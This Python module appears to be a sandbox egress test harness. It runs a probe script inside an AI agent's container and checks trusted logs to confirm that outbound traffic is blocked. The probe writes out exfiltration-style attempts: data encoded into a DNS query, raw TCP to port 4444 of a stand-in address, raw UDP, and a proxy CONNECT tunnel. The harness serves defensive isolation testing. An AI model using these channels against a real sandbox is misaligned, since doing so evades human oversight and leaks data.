# SPDX-License-Identifier: Apache-2.0
"""Deterministic in-container ISO-2 adversarial probe and proof verifier.

The probe program is sent to the already-running agent container over
``docker exec -i ... python3 -``.  It receives no repository files, pack data,
or additional environment.  Its stdout contains case identifiers and coarse
outcomes only; destinations and exception text never cross the container
boundary.  Destination details are proven independently by the trusted,
secret-safe gateway/guard event stream.
"""

from __future__ import annotations

import json
import re
import subprocess
import threading
import time
from dataclasses import dataclass
from typing import Callable, Sequence

from harness.protocol import HarnessEvent, HarnessEventSource
from sandbox.gateway import destination_token
from sandbox.orchestration import IsolationPlan

PROBE_SCHEMA = "sandbox_egress_probe/v1"
ALLOWED_FIREWORKS_DOMAIN = "api.fireworks.ai"

_CASE_IDS = (
    "allowed_fireworks_https",
    "blocked_hostname_https",
    "blocked_redirect_https",
    "dns_exfil_udp",
    "raw_ipv4_tcp",
    "raw_udp",
    "websocket_connect",
)
_OUTCOMES = {"reachable", "unreachable", "attempted", "refused", "unexpected"}
_DIGEST_TOKEN_RE = re.compile(
    r"^(?:domain|dns|dns-server|ipv4|opaque)-sha256:[0-9a-f]{64}$"
)

_BLOCKED_HOST = "data.binance.vision"
_REDIRECT_HOST = "redirect-proof.example"
_DNS_EXFIL_NAME = "7365637265742d70726f6265.iso2-proof.invalid"
_RAW_TCP_IP = "198.51.100.10"
_RAW_TCP_PORT = 4444
_RAW_UDP_PAYLOAD = b"tradeevolve-iso2-proof"
_WEBSOCKET_HOST = "websocket-proof.example"


# Standalone stdlib program: keep imports and constants inside the string so
# the agent image needs Python but no TradeEvolve package beyond its own app.
PROBE_SCRIPT = r'''from __future__ import annotations
import io
import json
import os
import socket
from email.message import Message
import urllib.error
import urllib.parse
import urllib.request
import urllib.response

def result(case_id, outcome):
    return {"id": case_id, "outcome": outcome}

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def allowed_https():
    opener = urllib.request.build_opener(NoRedirect())
    request = urllib.request.Request(
        "https://api.fireworks.ai/",
        method="HEAD",
        headers={"User-Agent": "tradeevolve-iso2-proof/1"},
    )
    try:
        with opener.open(request, timeout=5) as response:
            response.read(0)
        return "reachable"
    except urllib.error.HTTPError:
        return "reachable"
    except Exception:
        return "unreachable"

def blocked_https():
    request = urllib.request.Request(
        "https://data.binance.vision/",
        method="HEAD",
        headers={"User-Agent": "tradeevolve-iso2-proof/1"},
    )
    try:
        with urllib.request.urlopen(request, timeout=2) as response:
            response.read(0)
        return "unexpected"
    except Exception:
        return "refused"

class SyntheticRedirect(urllib.request.BaseHandler):
    handler_order = 50

    def http_open(self, request):
        if request.full_url != "http://redirect-source.invalid/":
            return None
        headers = Message()
        headers["Location"] = "https://redirect-proof.example/"
        response = urllib.response.addinfourl(
            io.BytesIO(b""),
            headers,
            request.full_url,
            code=302,
        )
        response.msg = "Found"
        return response

def blocked_redirect():
    opener = urllib.request.build_opener(SyntheticRedirect())
    try:
        with opener.open("http://redirect-source.invalid/", timeout=2) as response:
            response.read(0)
        return "unexpected"
    except Exception:
        return "refused"

def dns_query(name):
    labels = b"".join(
        bytes([len(label)]) + label.encode("ascii") for label in name.split(".")
    )
    return (
        b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        + labels
        + b"\x00\x00\x01\x00\x01"
    )

def udp_attempt(address, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    try:
        sock.sendto(payload, (address, port))
        return "attempted"
    except Exception:
        return "refused"
    finally:
        sock.close()

def tcp_attempt(address, port, payload=b""):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect((address, port))
        if payload:
            try:
                sock.sendall(payload)
            except Exception:
                pass
        return "attempted"
    except Exception:
        return "refused"
    finally:
        sock.close()

def websocket_connect():
    proxy = os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")
    if not proxy:
        return "unexpected"
    parsed = urllib.parse.urlsplit(proxy)
    if parsed.scheme != "http" or parsed.hostname is None:
        return "unexpected"
    port = parsed.port or 80
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        sock.connect((parsed.hostname, port))
        sock.sendall(
            b"CONNECT websocket-proof.example:443 HTTP/1.1\r\n"
            b"Host: websocket-proof.example:443\r\n\r\n"
        )
        response = sock.recv(128)
        return "refused" if response.startswith(b"HTTP/1.1 403") else "unexpected"
    except Exception:
        return "refused"
    finally:
        sock.close()

cases = [
    result("allowed_fireworks_https", allowed_https()),
    result("blocked_hostname_https", blocked_https()),
    result("blocked_redirect_https", blocked_redirect()),
    result(
        "dns_exfil_udp",
        udp_attempt(
            "198.51.100.53",
            53,
            dns_query("7365637265742d70726f6265.iso2-proof.invalid"),
        ),
    ),
    result(
        "raw_ipv4_tcp",
        tcp_attempt("198.51.100.10", 4444, b"tradeevolve-iso2-proof"),
    ),
    result(
        "raw_udp",
        udp_attempt("198.51.100.11", 4445, b"tradeevolve-iso2-proof"),
    ),
    result("websocket_connect", websocket_connect()),
]
print(
    json.dumps(
        {"schema": "sandbox_egress_probe/v1", "cases": cases},
        allow_nan=False,
        ensure_ascii=True,
        sort_keys=True,
        separators=(",", ":"),
    )
)
'''


class EgressProbeError(RuntimeError):
    """The in-container result or trusted block evidence is incomplete."""


@dataclass(frozen=True)
class ProbeCaseResult:
    case_id: str
    outcome: str


@dataclass(frozen=True)
class ProbeReceipt:
    cases: tuple[ProbeCaseResult, ...]


@dataclass(frozen=True)
class ExpectedBlock:
    case_id: str
    destination: str
    port: int | None
    protocol: str


@dataclass(frozen=True)
class EgressProof:
    """Complete ISO-2 receipt with secret-safe frozen event payloads."""

    receipt: ProbeReceipt
    matched_events: tuple[HarnessEvent, ...]


def expected_blocks() -> tuple[ExpectedBlock, ...]:
    """Return the exact deterministic facts the kernel/proxy must witness."""

    return (
        ExpectedBlock(
            case_id="blocked_hostname_https",
            destination=destination_token(_BLOCKED_HOST, kind="domain"),
            port=443,
            protocol="https",
        ),
        ExpectedBlock(
            case_id="blocked_redirect_https",
            destination=destination_token(_REDIRECT_HOST, kind="domain"),
            port=443,
            protocol="https",
        ),
        ExpectedBlock(
            case_id="dns_exfil_udp",
            destination=destination_token(_DNS_EXFIL_NAME, kind="dns"),
            port=None,
            protocol="dns",
        ),
        ExpectedBlock(
            case_id="raw_ipv4_tcp",
            destination=destination_token(_RAW_TCP_IP, kind="ipv4"),
            port=_RAW_TCP_PORT,
            protocol="tcp",
        ),
        ExpectedBlock(
            case_id="raw_udp",
            destination=destination_token(_RAW_UDP_PAYLOAD, kind="opaque"),
            port=None,
            protocol="udp",
        ),
        ExpectedBlock(
            case_id="websocket_connect",
            destination=destination_token(_WEBSOCKET_HOST, kind="domain"),
            port=443,
            protocol="https",
        ),
    )


def _no_duplicate_object(pairs: list[tuple[str, object]]) -> dict[str, object]:
    value: dict[str, object] = {}
    for key, item in pairs:
        if key in value:
            raise EgressProbeError("probe result contains duplicate JSON keys")
        value[key] = item
    return value


def _reject_number(_value: str) -> object:
    raise EgressProbeError("probe result may not contain fractional numbers")


def parse_probe_receipt(raw: str | bytes) -> ProbeReceipt:
    """Parse the one-line, destination-free result from the agent container."""

    encoded = raw.encode("utf-8") if isinstance(raw, str) else raw
    if encoded.endswith(b"\r\n"):
        encoded = encoded[:-2]
    elif encoded.endswith(b"\n"):
        encoded = encoded[:-1]
    if not encoded or len(encoded) > 4096 or b"\n" in encoded or b"\r" in encoded:
        raise EgressProbeError("probe result is empty, oversized, or multiline")
    try:
        decoded = encoded.decode("ascii")
    except UnicodeDecodeError as exc:
        raise EgressProbeError("probe result must be ASCII") from exc
    try:
        value = json.loads(
            decoded,
            object_pairs_hook=_no_duplicate_object,
            parse_float=_reject_number,
            parse_constant=_reject_number,
        )
    except json.JSONDecodeError as exc:
        raise EgressProbeError("probe result is not valid JSON") from exc
    if not isinstance(value, dict) or set(value) != {"schema", "cases"}:
        raise EgressProbeError("probe result envelope has unexpected fields")
    if value["schema"] != PROBE_SCHEMA:
        raise EgressProbeError("probe result schema mismatch")
    raw_cases = value["cases"]
    if not isinstance(raw_cases, list) or len(raw_cases) != len(_CASE_IDS):
        raise EgressProbeError("probe result has the wrong case count")
    cases: list[ProbeCaseResult] = []
    for index, raw_case in enumerate(raw_cases):
        if not isinstance(raw_case, dict) or set(raw_case) != {"id", "outcome"}:
            raise EgressProbeError("probe case has unexpected fields")
        case_id = raw_case["id"]
        outcome = raw_case["outcome"]
        if case_id != _CASE_IDS[index]:
            raise EgressProbeError("probe case order/id mismatch")
        if not isinstance(outcome, str) or outcome not in _OUTCOMES:
            raise EgressProbeError("probe case outcome is invalid")
        cases.append(ProbeCaseResult(case_id=case_id, outcome=outcome))
    return ProbeReceipt(cases=tuple(cases))


def _event_key(event: HarnessEvent) -> tuple[str, int | None, str]:
    if event.type != "EgressBlocked":
        raise EgressProbeError("proof received a non-EgressBlocked harness event")
    payload = event.payload
    if set(payload) != {"destination", "port", "protocol", "count"}:
        raise EgressProbeError("proof event payload has unexpected fields")
    destination = payload["destination"]
    port = payload["port"]
    protocol = payload["protocol"]
    count = payload["count"]
    if (
        not isinstance(destination, str)
        or _DIGEST_TOKEN_RE.fullmatch(destination) is None
        or (
            port is not None
            and (
                not isinstance(port, int)
                or isinstance(port, bool)
                or not 0 <= port <= 65_535
            )
        )
        or not isinstance(protocol, str)
        or protocol not in {"https", "dns", "tcp", "udp", "other"}
        or not isinstance(count, int)
        or isinstance(count, bool)
        or count < 1
    ):
        raise EgressProbeError("proof event payload is invalid")
    return destination, port, protocol


def verify_egress_proof(
    receipt: ProbeReceipt,
    events: Sequence[HarnessEvent],
) -> EgressProof:
    """Require allowed reachability and one trusted block per attack class."""

    outcomes = {case.case_id: case.outcome for case in receipt.cases}
    if outcomes["allowed_fireworks_https"] != "reachable":
        raise EgressProbeError("allowed Fireworks HTTPS endpoint was not reachable")
    for expectation in expected_blocks():
        if outcomes[expectation.case_id] not in {"attempted", "refused"}:
            raise EgressProbeError(
                f"probe case {expectation.case_id} did not attempt/refuse egress"
            )

    keyed_events: dict[tuple[str, int | None, str], list[HarnessEvent]] = {}
    for event in events:
        keyed_events.setdefault(_event_key(event), []).append(event)

    allowed_key = (
        destination_token(ALLOWED_FIREWORKS_DOMAIN, kind="domain"),
        443,
        "https",
    )
    if allowed_key in keyed_events:
        raise EgressProbeError("allowed Fireworks endpoint produced a block event")

    expected_keys = {
        (expectation.destination, expectation.port, expectation.protocol)
        for expectation in expected_blocks()
    }
    if any(key not in expected_keys for key in keyed_events):
        raise EgressProbeError("proof contains an unexpected block event")

    matched: list[HarnessEvent] = []
    for expectation in expected_blocks():
        key = (
            expectation.destination,
            expectation.port,
            expectation.protocol,
        )
        candidates = keyed_events.get(key)
        if not candidates:
            raise EgressProbeError(
                f"missing trusted EgressBlocked evidence for {expectation.case_id}"
            )
        if len(candidates) != 1:
            raise EgressProbeError(
                f"duplicate trusted EgressBlocked evidence for {expectation.case_id}"
            )
        if candidates[0].payload["count"] != 1:
            raise EgressProbeError(
                f"non-unit EgressBlocked count for {expectation.case_id}"
            )
        matched.append(candidates[0])
    return EgressProof(receipt=receipt, matched_events=tuple(matched))


RunInput = Callable[[tuple[str, ...], bytes], str]
Monotonic = Callable[[], float]
Sleep = Callable[[float], None]


def _run_input(command: tuple[str, ...], program: bytes) -> str:
    try:
        completed = subprocess.run(
            command,
            input=program,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            timeout=30,
        )
    except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired) as exc:
        raise EgressProbeError("in-container egress probe failed") from exc
    try:
        return completed.stdout.decode("ascii")
    except UnicodeDecodeError as exc:
        raise EgressProbeError("in-container egress probe output was not ASCII") from exc


class DockerEgressProbeRunner:
    """Execute the proof in the agent container and reconcile trusted logs."""

    def __init__(
        self,
        *,
        plan: IsolationPlan,
        event_source: HarnessEventSource,
        run_input: RunInput = _run_input,
        monotonic: Monotonic = time.monotonic,
        sleep: Sleep = time.sleep,
        evidence_timeout_s: float = 2.0,
    ) -> None:
        if plan.endpoint_domains != (ALLOWED_FIREWORKS_DOMAIN,):
            raise ValueError(
                "ISO-2 probe requires the exact Fireworks endpoint allowlist"
            )
        if evidence_timeout_s <= 0:
            raise ValueError("evidence timeout must be positive")
        self._plan = plan
        self._event_source = event_source
        self._run_input = run_input
        self._monotonic = monotonic
        self._sleep = sleep
        self._evidence_timeout_s = evidence_timeout_s
        self._lock = threading.Lock()

    def run(self) -> EgressProof:
        """Run once; old log facts are baselined and cannot satisfy this proof."""

        with self._lock:
            self._event_source.drain_harness_events()
            raw = self._run_input(
                (
                    "docker",
                    "exec",
                    "--interactive",
                    "--user",
                    f"{self._plan.agent_uid}:{self._plan.agent_uid}",
                    self._plan.agent_name,
                    "python3",
                    "-",
                ),
                PROBE_SCRIPT.encode("ascii"),
            )
            receipt = parse_probe_receipt(raw)
            deadline = self._monotonic() + self._evidence_timeout_s
            events: list[HarnessEvent] = []
            last_error: EgressProbeError | None = None
            while True:
                events.extend(self._event_source.drain_harness_events())
                try:
                    return verify_egress_proof(receipt, events)
                except EgressProbeError as exc:
                    last_error = exc
                if self._monotonic() >= deadline:
                    if last_error is None:
                        raise AssertionError("proof loop lost its failure")
                    raise last_error
                self._sleep(0.05)
